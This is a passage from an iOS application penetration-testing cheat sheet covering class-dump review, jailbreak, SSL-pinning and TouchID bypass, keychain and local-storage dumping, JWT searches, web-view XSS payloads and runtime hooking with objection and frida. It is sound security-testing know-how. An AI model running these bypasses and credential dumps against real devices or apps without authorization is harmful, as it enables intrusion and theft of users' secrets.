<span class="p">-</span> <span class="p">(</span><span class="kt">_Bool</span><span class="p">)</span><span class="nf">writeSlice:</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">x0</span><span class="p">;</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">x1</span><span class="p">;</span><span class="w"> </span><span class="p">})</span><span class="nv">slice</span><span class="p">;</span>
<span class="p">-</span> <span class="p">(</span><span class="kt">_Bool</span><span class="p">)</span><span class="nf">writeData:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">data</span><span class="p">;</span>
<span class="p">-</span> <span class="p">(</span><span class="kt">_Bool</span><span class="p">)</span><span class="nf">writeContentsOfStream:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">stream</span><span class="p">;</span>

<span class="k">@end</span>

<span class="cp">###endif </span><span class="cm">/* MYZipWriter_h */</span>
</code></pre></div>
<p>Key Elements:</p>
<ul>
<li><strong>Class Inheritance</strong>: The class declaration (<strong>@interface</strong>) shows the class and the superclass it inherits from. For example,&nbsp;<strong>MYZipWriter : NSObject</strong>&nbsp;indicates that&nbsp;<strong>MYZipWriter</strong>&nbsp;is a custom class inheriting from&nbsp;<strong>NSObject</strong>, and it conforms to the&nbsp;<strong>MYWriter</strong>&nbsp;protocol.</li>
<li><strong>Properties</strong>: The class&rsquo;s properties include typical read-only properties inherited from&nbsp;<strong>NSObject</strong>, such as&nbsp;<strong>hash</strong>,&nbsp;<strong>superclass</strong>,&nbsp;<strong>description</strong>, and&nbsp;<strong>debugDescription</strong>, indicating that&nbsp;<strong>MYZipWriter</strong>&nbsp;inherits common object properties.</li>
<li><strong>Variables</strong>: The class has several instance variables declared in the interface block. These include:<ul>
<li><strong>_writer</strong>: an object conforming to the&nbsp;<strong>MYWriter</strong>&nbsp;protocol, likely used to handle writing operations.</li>
<li><strong>_zipper</strong>: an instance of&nbsp;<strong>MYZip</strong>, probably responsible for managing zip-related functionality.</li>
<li><strong>_zippedBuf</strong>: an&nbsp;<strong>NSMutableData</strong>&nbsp;object, likely used as a buffer to store compressed data.</li>
<li><strong>_zipped</strong>: a structure containing raw byte data (<strong>void *bytes</strong>) and its length, which is likely used to handle low-level zip data manipulation.</li>
</ul>
</li>
<li><strong>Methods</strong>: Look for methods the class exposes. These are defined with&nbsp;<strong>-</strong>&nbsp;or&nbsp;<strong>+</strong>&nbsp;(instance and class methods respectively). Examples include&nbsp;<strong>- (id)initWithWriter:(id)writer compressing:(_Bool)compressing</strong>, an initializer likely used to configure the writer and compression settings, and data-writing methods such as&nbsp;<strong>- (_Bool)writeSlice:</strong>&nbsp;and -&nbsp;<strong>(_Bool)writeData:</strong>, which suggest functionality for writing data slices and other content.</li>
</ul>
<p>Determine Potential Attack Surfaces:</p>
<ul>
<li>Look for methods that handle&nbsp;<strong>network requests</strong>,&nbsp;<strong>data serialization</strong>,&nbsp;<strong>encryption</strong>, or&nbsp;<strong>user input</strong>. These are often crucial for security testing.</li>
<li>Look for properties like&nbsp;<strong>NSString</strong>,&nbsp;<strong>NSDictionary</strong>,&nbsp;<strong>NSArray</strong>, or&nbsp;<strong>NSData</strong>&nbsp;that store sensitive data, such as passwords or API tokens.</li>
</ul>
<p><strong>Step 2: Analyze the Methods</strong></p>
<p>Once you have identified the methods in the header files, think about what they do:</p>
<ul>
<li><strong>Networking Methods</strong>: Methods like&nbsp;<strong>- (void)fetchDataFromURL:(NSURL *)url</strong>&nbsp;suggest that the app communicates with external servers. Look into these methods for potential issues such as insecure HTTP requests or improper handling of responses.</li>
<li><strong>Authentication and User Data</strong>: Methods like&nbsp;<strong>- (void)loginWithUsername:(NSString <em>)username password:(NSString </em>)password</strong>&nbsp;or properties like&nbsp;<strong>userToken</strong>&nbsp;may indicate where authentication logic happens. These areas are important for identifying vulnerabilities such as weak password handling or insecure storage of sensitive information.</li>
</ul>
<h4 id="swift-analysis">Swift Analysis</h4>
<p><strong>Step 1: Review Swift Class Names and Methods</strong></p>
<p>Below a snippet with a typical Swift class structure from the&nbsp;<strong>swift_dump</strong>&nbsp;file:
&nbsp;</p>
<div class="highlight"><pre><span></span><code><span class="kd">class</span> <span class="nc">DVIA_v2</span><span class="p">.</span><span class="n">ApplicationPatchingDetailsViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
  <span class="cm">/* fields */</span>
    <span class="kd">var</span> <span class="nv">usernameTextField</span><span class="p">:</span> <span class="bp">UITextField</span><span class="p">?</span>
    <span class="kd">var</span> <span class="nv">passwordTextField</span><span class="p">:</span> <span class="bp">UITextField</span><span class="p">?</span>
  <span class="cm">/* methods */</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">usernameTextField</span><span class="p">.</span><span class="n">getter</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">usernameTextField</span><span class="p">.</span><span class="n">setter</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">usernameTextField</span><span class="p">.</span><span class="n">modify</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">passwordTextField</span><span class="p">.</span><span class="n">getter</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">passwordTextField</span><span class="p">.</span><span class="n">setter</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">passwordTextField</span><span class="p">.</span><span class="n">modify</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">loginButtonTapped</span><span class="p">(</span><span class="kc">_</span><span class="p">:)</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">jailbreakTestTapped</span><span class="p">(</span><span class="kc">_</span><span class="p">:)</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">showAlertTapped</span><span class="p">(</span><span class="kc">_</span><span class="p">:)</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">killApplicationTapped</span><span class="p">(</span><span class="kc">_</span><span class="p">:)</span>
    <span class="kd">func</span> <span class="nf">ApplicationPatchingDetailsViewController</span><span class="p">.</span><span class="n">textFieldShouldReturn</span><span class="p">(</span><span class="kc">_</span><span class="p">:)</span>
<span class="p">}</span>
</code></pre></div>
<p>Key Elements:</p>
<ul>
<li><strong>Class Names</strong>: Look for class names to identify the app&rsquo;s architecture. Names like&nbsp;<strong>UserManager</strong>,&nbsp;<strong>NetworkClient</strong>, or&nbsp;<strong>EncryptionHandler</strong>&nbsp;give a clear indication of the app&rsquo;s key components.</li>
<li><strong>Field Names</strong>: The class contains fields such as&nbsp;<strong>usernameTextField</strong>&nbsp;and&nbsp;<strong>passwordTextField</strong>, which are likely used for user input related to login credentials. These&nbsp;<strong>UITextField?</strong>&nbsp;types suggest the view controller manages a login or authentication interface, as indicated by the presence of these input fields.</li>
<li><strong>Method Names</strong>: Look at the method names for functionality. Methods like&nbsp;<strong>func loginButtonTapped(_:)</strong>&nbsp;indicate user authentication logic, while&nbsp;<strong>func sendRequestOverUrl(_:)</strong>&nbsp;may indicate a network request.</li>
</ul>
<p><strong>Step 2: Analyze Swift Method Names</strong></p>
<p>Look for important method names and infer their role:  </p>
<ul>
<li><strong>Network-related Methods</strong>: Methods like&nbsp;<strong>func fetchData(_:)</strong>&nbsp;or&nbsp;<strong>func sendRequest(_:)</strong>&nbsp;are indicators that the app interacts with external services. You can review these methods to understand how data is transmitted or received.  </li>
<li><strong>Cryptography Methods</strong>: Look for names like&nbsp;<strong>func encryptData(_:)</strong>&nbsp;or&nbsp;<strong>func decryptData(_:)</strong>. This gives you insight into how the app manages encryption, which is essential when analyzing apps that handle sensitive information.  </li>
<li><strong>Error Handling</strong>: Methods like&nbsp;<strong>func showError(_:)</strong>&nbsp;or&nbsp;<strong>func handleError(_:)</strong>&nbsp;may reveal how the app responds to errors. Poor error handling can sometimes reveal sensitive information to an attacker.</li>
</ul>
<h4 id="nuclei">Nuclei</h4>
<p>Run <code>nuclei</code> templates on the application's plist:</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>&lt;plist<span class="w"> </span>path&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>nuclei<span class="w"> </span>-t<span class="w"> </span>/&lt;path-to-template-folder&gt;<span class="w"> </span>-file
</code></pre></div>
<h4 id="forensics">Forensics</h4>
<p>https://www.mobilehackinglab.com/blog/tool-review-exploring-ileapp-for-ios-forensics</p>
<h3 id="dynamic-analysis_3">Dynamic Analysis</h3>
<h4 id="jailbreak-detection-bypass">Jailbreak Detection Bypass</h4>
<p>Useful resources:</p>
<ul>
<li>https://codeshare.frida.re</li>
<li>https://jlippold.github.io/tweakCompatible/package.html###!/com.ryleyangus.libertylite/details/0.2.10</li>
<li>https://github.com/jjolano/shadow</li>
</ul>
<p>Try bypassing Jailbreak detection with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios jailbreak disable
</code></pre></div>
<p>Simulate a Jailbroken device with <code>objection</code> - useful to check if the app has Jailbreak detection checks when testing in non-Jailbroken environment:</p>
<div class="highlight"><pre><span></span><code>&gt; ios jailbreak simulate
</code></pre></div>
<h4 id="ssl-pinning-bypass">SSL Pinning Bypass</h4>
<p>Bypass SSL pinning with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios sslpinning disable
</code></pre></div>
<p>Bypass SSL pinning with <a href="https://github.com/NyaMisty/ssl-kill-switch3">ssl-kill-switch3</a>:</p>
<ol>
<li>Download the .deb packaged depending on Jailbreak type (rootless or rootful)</li>
<li>Run <code>dpkg -i &lt;.deb&gt;</code> to install the tweak</li>
<li>In <code>Setting &gt; SSL Killswitch 3</code> toggle SSL pinning</li>
<li>Each time SSL pinning is toggled, close and re-open the application for the change to take effect.</li>
</ol>
<p>Check hooked classes and methods for SSL Pinning bypass with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios hooking list classes | grep NSURL
&gt; ios hooking list methods -c NSURLSession
</code></pre></div>
<h4 id="touchid-bypass">TouchID Bypass</h4>
<p>Trace biometrics usage (LocalAuthentication.framework) with <code>frida-trace</code>:</p>
<div class="highlight"><pre><span></span><code>frida-trace<span class="w"> </span>-U<span class="w"> </span>-m<span class="w"> </span><span class="s2">"*[LAContext *]"</span><span class="w"> </span>-p<span class="w"> </span>&lt;PID&gt;
</code></pre></div>
<p>Bypass TouchID authentication with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>ios<span class="w"> </span>ui<span class="w"> </span>biometrics_bypass
</code></pre></div>
<h4 id="uipasteboard">UIPasteboard</h4>
<p>Monitor UIPasteboard inputs with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios pasteboard monitor
</code></pre></div>
<h4 id="local-data-storage">Local Data Storage</h4>
<p>Check <code>Info.plist</code> at path: <code>/var/containers/Bundle/Application/&lt;bundle id&gt;</code></p>
<p>Check local storage at path: <code>/var/mobile/Containers/Data/Application/&lt;data id&gt;</code></p>
<p>Data id can be found as follows:</p>
<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-RiaoH<span class="w"> </span><span class="s1">'&lt;app name&gt;'</span><span class="w"> </span>/var/mobile/Containers/Data/Application<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span>/<span class="w"> </span>-f<span class="w"> </span><span class="m">7</span>
</code></pre></div>
<p>Enumerate all possible application databases:</p>
<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/var/mobile/Containers/Data/Application/&lt;data<span class="w"> </span>id&gt;<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sqlite*"</span><span class="w"> </span>-or<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.db"</span>
</code></pre></div>
<p>Search for JWT (e.g in the Data folder):</p>
<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-RiahE<span class="w"> </span><span class="s1">'^ey([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)'</span><span class="w"> </span>/var/mobile/Containers/Data/Application/&lt;data<span class="w"> </span>id&gt;<span class="w"> </span>
</code></pre></div>
<p>When dealing with simulators, replace <code>/var/mobile</code> with <code>~/Library/Developer/CoreSimulator/Devices/&lt;simulator UDID&gt;/data</code>.</p>
<h5 id="userdefaults">UserDefaults</h5>
<p>Values stored in the <code>NSUserDefaults</code> are generally located at: <code>/var/mobile/Containers/Data/Application/&lt;data id&gt;/Library/Preferences/&lt;app identifier&gt;.plist</code></p>
<p>When using <strong>suite names</strong>&nbsp;(e.g.&nbsp;<code>initWithSuiteName:</code>&nbsp;or App Groups), the file is stored in the&nbsp;<em>App Group container</em>&nbsp;under&nbsp;<code>Library/Preferences/</code>&nbsp;instead of the main container.</p>
<p><code>NSUserDefaults</code> is generally used to store small pieces of application information, typically settings. </p>
<p>Get <code>NSUserDefaults</code> with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### Open the app with objection (will be DEPRECATED)</span>
objection<span class="w"> </span>-g<span class="w"> </span>&lt;app<span class="w"> </span>identifier&gt;<span class="w"> </span>explore

<span class="c1">###&nbsp;Get user defaults content</span>
&gt;<span class="w"> </span>ios<span class="w"> </span>nsuserdefaults<span class="w"> </span>get
</code></pre></div>
<h5 id="shared-credentials-storage">Shared Credentials Storage</h5>
<p>The manager of a shared credentials cache.</p>
<p>Dump <code>NSUrlCredentialsStorage</code> with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt;<span class="w"> </span>ios<span class="w"> </span>nsurlcredentialstorage<span class="w"> </span>dump
</code></pre></div>
<h5 id="keychain_1">Keychain</h5>
<p>Dump device keychain content with <a href="https://github.com/ptoomey3/Keychain-Dumper">Keychain-Dumper</a>:</p>
<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>https://raw.githubusercontent.com/ptoomey3/Keychain-Dumper/refs/heads/master/updateEntitlements.sh
sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">''</span><span class="w"> </span><span class="s1">'s/KEYCHAIN_DUMPER_FOLDER=\/usr\/bin/KEYCHAIN_DUMPER_FOLDER=\/var\/jb\/usr\/bin/g'</span><span class="w"> </span>updateEntitlements.sh

scp<span class="w"> </span>keychain_dumper<span class="w"> </span>mobile@&lt;deviceip&gt;:/var/jb/usr/bin/
scp<span class="w"> </span>updateEntitlements.sh

<span class="c1">### SSH on iOS device</span>
chmod<span class="w"> </span>+w<span class="w"> </span>/var/jb/usr/bin/keychain_dumper
chmod<span class="w"> </span>+w<span class="w"> </span>/var/jb/usr/bin/updateEntitlements.sh
chmod<span class="w"> </span>+r<span class="w"> </span>/private/var/Keychains/keychain-2.db

/var/jb/usr/bin/updateEntitlements.sh
/var/jb/usr/bin/keychain_dumper<span class="w"> </span>&gt;<span class="w"> </span>result.txt
</code></pre></div>
<p><strong>Note</strong>: Some keychain entries are available regardless of whether the iOS is locked or not, while other entries will only be accessible if the iOS device is unlocked.</p>
<p>Check if keychain is being used somewhere in the application:</p>
<div class="highlight"><pre><span></span><code>strings<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>SecItem
</code></pre></div>
<p>Dump application's keychain content with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1">### Open the app with objection (will be DEPRECATED)</span>
objection<span class="w"> </span>-g<span class="w"> </span>&lt;app<span class="w"> </span>identifier&gt;<span class="w"> </span>explore

<span class="c1">###&nbsp;Get user defaults content</span>
&gt;<span class="w"> </span>ios<span class="w"> </span>keychain<span class="w"> </span>dump
</code></pre></div>
<h5 id="coredata">CoreData</h5>
<p>Core data is saved as .sqlite or as .store database at the following path: <code>/var/mobile/Containers/Data/Application/&lt;data id&gt;/Library/Application Support</code></p>
<p><strong>Note</strong>: when copying the .sqlite database, remember to copy also the '-shm' and '-wal' files! Otherwise, the db would be empty.</p>
<h5 id="cache">Cache</h5>
<p>Cache data is stored at path: `/var/mobile/Containers/Data/Application/<data id="">/Library/Caches</data></p>
<h5 id="keyboard-cache">Keyboard Cache</h5>
<p>Several options, such as autocorrect and spell check, are available to users to simplify keyboard input and are cached by default in&nbsp;<code>.dat</code>&nbsp;files in&nbsp;<code>/private/var/mobile/Library/Keyboard/</code>&nbsp;and its subdirectories.</p>
<h5 id="yap-database">Yap Database</h5>
<p>Data is stored in the <code>database2</code> table. The column containing the data is a blob containing a serialized <code>NSKeyedArchiver</code> object.
Use the following script to dump the YapDatabase.sqlite decoded content:</p>
<div class="highlight"><pre><span></span><code><span class="c1">###!/usr/bin/env python3</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">sqlite3</span>
<span class="kn">import</span> <span class="nn">plistlib</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
        <span class="n">description</span><span class="o">=</span><span class="s2">"Query a YapDatabase SQLite file and try to decode plist blobs."</span>
    <span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">"db"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">"Path to YapDatabase.sqlite file"</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">db</span><span class="p">)</span>
    <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">cur</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">"SELECT * FROM database2"</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[!] SQL error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="n">rows</span> <span class="o">=</span> <span class="n">cur</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">rows</span><span class="p">:</span>
        <span class="n">decoded</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="n">row</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">col</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="n">decoded_obj</span> <span class="o">=</span> <span class="n">plistlib</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">col</span><span class="p">)</span>
                    <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">decoded_obj</span><span class="p">)</span>
                <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
                    <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s2">"&lt;binary </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">col</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes&gt;"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">col</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>
<h5 id="background-screenshot">Background Screenshot</h5>
<p>By default, a screenshot is saved when the application goes into the background:</p>
<ul>
<li>Screenshots are stored inside the app's container at<code>/var/mobile/Containers/Data/Application/$APP_ID/Library/SplashBoard/Snapshots/sceneID:$APP_NAME-default/</code>.</li>
</ul>
<h4 id="crypto_1">Crypto</h4>
<p>Monitor cryptographic functions such as encryption, decryption, and hashing as they are executed in real time with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>ios<span class="w"> </span>monitor<span class="w"> </span>crypto
</code></pre></div>
<h4 id="inter-process-communication">Inter-Process-Communication</h4>
<h6 id="universal-links-url-schemes">Universal Links &amp; URL Schemes</h6>
<p>Check what universal links are allowed by looking for the entitlement <code>com.apple.developer.associated-domains</code>.</p>
<p>Validate Apple App Site Association (AASA) - Universal Links with <a href="https://github.com/chayev/yurl">yurl</a>:</p>
<div class="highlight"><pre><span></span><code>yurl<span class="w"> </span>aasa<span class="w"> </span>validate<span class="w"> </span>&lt;domain&gt;
</code></pre></div>
<p>URL schemes are registered in the <code>Info.plist</code> in the <code>CFBundleURLTypes</code> property.</p>
<ul>
<li>Deeplinks handler are usually Scenes. Those are generally registered in the <code>UIApplicationSceneManifest</code> property in the <code>Info.plist</code>.</li>
</ul>
<p>Enumerate possible Universal Links or app links using URL Schemes:</p>
<div class="highlight"><pre><span></span><code>strings<span class="w"> </span>&lt;binary&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"://"</span>
</code></pre></div>
<p>Open a link on an iOS device (ssh to to device) using <code>uiopen</code>:</p>
<div class="highlight"><pre><span></span><code>uiopen<span class="w"> </span>&lt;link&gt;
</code></pre></div>
<p>Open a link on an iOS simulator:</p>
<div class="highlight"><pre><span></span><code>xcrun<span class="w"> </span>simctl<span class="w"> </span>openurl<span class="w"> </span>booted<span class="w"> </span><span class="s1">'&lt;INSERT_URL_HERE&gt;'</span>
</code></pre></div>
<p>Trace <code>openURL</code> usage with <code>frida-trace</code>:</p>
<div class="highlight"><pre><span></span><code>frida-trace<span class="w"> </span>-U<span class="w"> </span>-m<span class="w"> </span><span class="s2">"*[* *openURL*]"</span><span class="w"> </span>-p<span class="w"> </span>&lt;app<span class="w"> </span>PID&gt;
</code></pre></div>
<h5 id="app-extensions_2">App Extensions</h5>
<p>Grep for&nbsp;<code>NSExtensionPointIdentifier</code>&nbsp;among all files inside the app bundle (IPA or installed app):</p>
<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-nr<span class="w"> </span>NSExtensionPointIdentifier<span class="w"> </span>&lt;app<span class="w"> </span>folder&gt;
</code></pre></div>
<p>Look for <code>NSExtensionActivationRule</code> property in the <code>Info.plist</code>. That key specifies the data being supported as well as e.g. maximum of items supported</p>
<p>Hook <code>NSExtensionContext - inputItems</code> in the data originating app.</p>
<h3 id="input-validation_2">Input Validation</h3>
<p>In web views' form fields, try inject some of these payloads:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- XSS --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> <span class="cm">&lt;!-- or any xss payload --&gt;</span>

<span class="cm">&lt;!-- Open Mail App --&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"mailto:no-one@testemail?subject=look at this website&amp;body=Hi,I found this website and thought you might like it http://evil.com"</span><span class="p">&gt;</span>Open email app<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- Open Phone App --&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"tel:+1-847-555-5555"</span><span class="p">&gt;</span>Open phone app<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="memory-analysis">Memory Analysis</h4>
<p>Dump memory with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; memory dump all &lt;output directory&gt;
</code></pre></div>
<p>Search string in memory with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; memory search Password --string
</code></pre></div>
<p>Search bytes in memory with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&gt;</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="s">"&lt;space-separated bytes&gt;"</span><span class="w"> </span>

<span class="err">###</span><span class="w"> </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">example</span><span class="p">:</span><span class="w"> </span><span class="s">"50 61 73 73 77 6f 72 64"</span><span class="w"> </span><span class="c1">// Password</span>
<span class="err">###</span><span class="w"> </span><span class="nx">Placeholder</span><span class="w"> </span><span class="nx">example</span><span class="p">:</span><span class="w"> </span><span class="s">"50 ?? 73 73 77 ?? ?? 64"</span><span class="w"> </span><span class="c1">//P?ssw??d</span>
</code></pre></div>
<p>Dump memory with <a href="https://github.com/rootbsd/fridump3">fridump3</a>:</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>fridump3.py<span class="w"> </span>-u<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>&lt;output<span class="w"> </span>dir&gt;
</code></pre></div>
<h4 id="network-traffic-analysis">Network Traffic Analysis</h4>
<p>Since iOS 5, devices have included a <strong>Remote Virtual Interface (RVI)</strong> facility. An RVI allows to forward packets from a connected iOS device to a virtual network interface on the Mac.</p>
<p>Create a RVI for a connected device with <code>rvictl</code>; after running this command a new network interface is added (such as<code>rvi0</code>):</p>
<div class="highlight"><pre><span></span><code>rvictl<span class="w"> </span>-s<span class="w"> </span>&lt;device<span class="w"> </span>UDID&gt;
</code></pre></div>
<p>The device UDID can be found by using <code>xcrun</code>:</p>
<div class="highlight"><pre><span></span><code>xcrun<span class="w"> </span>xctrace<span class="w"> </span>list<span class="w"> </span>devices
<span class="c1">### OR only booted simulators</span>
xcrun<span class="w"> </span>simctl<span class="w"> </span>list<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">"Booted"</span>
</code></pre></div>
<p>Capture network traffic with <code>tcpdump</code>:</p>
<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>&lt;rvi<span class="w"> </span>interface&gt;<span class="w"> </span>-w<span class="w"> </span>&lt;outut<span class="w"> </span>.pcap&gt;
</code></pre></div>
<p>Remove the RVI interface with <code>rvictl</code>:</p>
<div class="highlight"><pre><span></span><code>rvictl<span class="w"> </span>-x<span class="w"> </span>&lt;device<span class="w"> </span>UDID&gt;
</code></pre></div>
<h4 id="hooking">Hooking</h4>
<p>Trace ObjC methods invocations with <code>frida-trace</code>:</p>
<div class="highlight"><pre><span></span><code>frida-trace<span class="w"> </span>-U<span class="w"> </span>-m<span class="w"> </span><span class="s2">"&lt;return type&gt;[&lt;class name&gt; &lt;method name&gt;]"</span><span class="w"> </span>-p<span class="w"> </span>&lt;PID&gt;
</code></pre></div>
<p>where:</p>
<ul>
<li><code>return type</code>: <code>-</code> for instance method, <code>+</code> for class method, <code>*</code> for any</li>
<li><code>class name</code>: name of the class or <code>*</code> for any</li>
<li><code>method name</code>: name of the method or <code>*</code> for any</li>
</ul>
<p>Search loaded classes with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios hooking search classes &lt;keyword&gt;
</code></pre></div>
<p>Search loaded methods with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios hooking search methods &lt;keyword&gt;
</code></pre></div>
<p>List Loaded Classes with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios hooking list classes
</code></pre></div>
<p>Explore Methods of a Class with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">&gt; </span><span class="ge">ios hooking list class_methods &lt;class&gt;</span>
</code></pre></div>
<p>Hook all class' methods with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code>&gt; ios hooking watch class "&lt;class name&gt;"
</code></pre></div>
<p>Hook Methods with <code>objection</code>:</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="w"> </span><span class="nv">ios</span><span class="w"> </span><span class="nv">hooking</span><span class="w"> </span><span class="nv">watch</span><span class="w"> </span><span class="nv">method</span><span class="w"> </span><span class="s2">"+[&lt;class&gt; &lt;method&gt;]"</span><span class="w"> </span><span class="o">--</span><span class="nv">dump</span><span class="o">-</span><span class="nv">args</span><span class="w"> </span><span class="o">--</span><span class="nv">dump</span><span class="o">-</span><span class="k">return</span>
</code></pre></div>
<p>Objection will print out details whenever this method is called during the app&rsquo;s execution.</p>
<p>Patch a method at runtime with <code>objection</code>:</p>
